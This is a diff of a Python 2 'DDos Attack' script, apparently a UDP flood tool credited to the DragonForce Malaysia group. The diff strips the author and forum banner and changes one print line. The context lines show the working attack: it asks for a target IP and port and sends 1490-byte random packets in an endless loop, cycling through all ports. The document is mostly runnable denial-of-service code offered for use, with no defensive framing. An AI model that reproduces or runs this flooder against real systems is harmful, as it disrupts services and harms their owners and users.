@@ -1,5 +1,3 @@
-#!/usr/bin/python
-# -*- coding: ascii -*-
 import sys
 import os
 import time
@@ -22,14 +20,6 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
 
-print
-print "Author   : DragonForceMy"
-print "Forum    : https://dragonforce.my"
-print "github   : https://github.com/waitercinta"
-print "Facebook : https://www.facebook.com/dragonforce.my"
-print "----------*Hak milik Rakyat Malaysia*---------------"
-print
-
 ip = raw_input("Masukkan IP Target : ")
 port = input  ("Masukkan Port      : ")
 
@@ -50,6 +40,6 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print "Sent %s packet to %s throught Port"%(sent,ip)
      if port == 65534:
        port = 1
